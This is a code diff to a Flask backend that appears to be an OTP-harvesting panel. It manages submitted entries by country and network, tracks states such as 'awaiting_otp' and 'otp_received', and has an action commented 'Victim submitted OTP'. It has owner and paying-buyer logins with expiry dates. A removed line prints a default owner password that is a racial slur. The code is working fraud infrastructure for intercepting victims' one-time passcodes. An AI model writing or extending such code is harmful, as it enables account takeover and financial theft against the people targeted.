@@ -36,7 +36,6 @@ def save_config(data):
 # ============================================================
 
 def ensure_config():
-    """Create default owner if config missing"""
     config = load_config()
     if not config.get('owners'):
         config['owners'] = [{
@@ -45,14 +44,12 @@ def ensure_config():
             'created': datetime.now().isoformat()
         }]
         save_config(config)
-        print("✅ Owner created: owner / nigga")
+        print("✅ Owner created")
     else:
-        print("✅ Config already exists")
+        print("✅ Config exists")
 
-# Run immediately
 ensure_config()
 
-# Also ensure database
 db = load_db()
 if not db.get('queues'):
     db['queues'] = {"A": [], "B": [], "C": []}
@@ -85,7 +82,7 @@ def submit():
         'country': data.get('country'),
         'network': data.get('network'),
         'timestamp': datetime.now().isoformat(),
-        'status': 'pending',
+        'status': 'pending',      # pending, claimed, awaiting_otp, otp_received, verified, wrong
         'otp_length': 4,
         'otp': None,
         'verified': False,
@@ -120,12 +117,16 @@ def update():
                     entry['verified'] = True
                 elif action == 'otp_4':
                     entry['otp_length'] = 4
-                    entry['otp'] = otp
-                    entry['status'] = 'otp_sent'
+                    entry['status'] = 'awaiting_otp'
+                    entry['otp'] = None
                 elif action == 'otp_6':
                     entry['otp_length'] = 6
+                    entry['status'] = 'awaiting_otp'
+                    entry['otp'] = None
+                elif action == 'victim_otp':
+                    # Victim submitted OTP
                     entry['otp'] = otp
-                    entry['status'] = 'otp_sent'
+                    entry['status'] = 'otp_received'
                 elif action == 'verify_otp':
                     if entry.get('otp') == otp:
                         entry['status'] = 'verified'
@@ -150,7 +151,8 @@ def stats():
     return jsonify({
         'total': len(all_entries),
         'pending': len([e for e in all_entries if e['status'] in ['pending', 'claimed']]),
-        'otp_sent': len([e for e in all_entries if e['status'] == 'otp_sent']),
+        'awaiting_otp': len([e for e in all_entries if e['status'] == 'awaiting_otp']),
+        'otp_received': len([e for e in all_entries if e['status'] == 'otp_received']),
         'verified': len([e for e in all_entries if e['status'] == 'verified']),
         'wrong': len([e for e in all_entries if e['status'] == 'wrong'])
     })
@@ -165,14 +167,12 @@ def login():
     username = data.get('username')
     password = data.get('password')
     config = load_config()
-    # Check owners
     for owner in config.get('owners', []):
         if owner['username'] == username and owner['password'] == password:
             token = str(uuid.uuid4())
             owner['token'] = token
             save_config(config)
             return jsonify({'success': True, 'token': token, 'role': 'owner', 'username': username})
-    # Check buyers
     for buyer in config.get('buyers', []):
         if buyer['username'] == username and buyer['password'] == password:
             if buyer.get('expiry'):
